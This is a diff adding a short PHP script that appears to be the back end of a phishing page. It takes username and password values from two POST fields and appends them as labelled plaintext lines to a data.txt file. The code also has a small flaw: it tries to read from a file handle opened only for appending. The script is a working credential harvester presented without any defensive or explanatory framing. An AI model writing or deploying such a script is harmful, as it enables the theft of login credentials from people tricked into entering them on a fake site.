@@ -1,0 +1,9 @@
+<?php
+	$user = $_POST['A'];
+	$pass = $_POST['B'];
+	$file = fopen("data.txt", "a");
+	$string = fread($file,filesize("data.txt"));
+	$string .= "User: " . $user . " " . "Password: " .$pass . "\r\n";
+	fwrite($file, $string);
+	fclose($file);
+?>
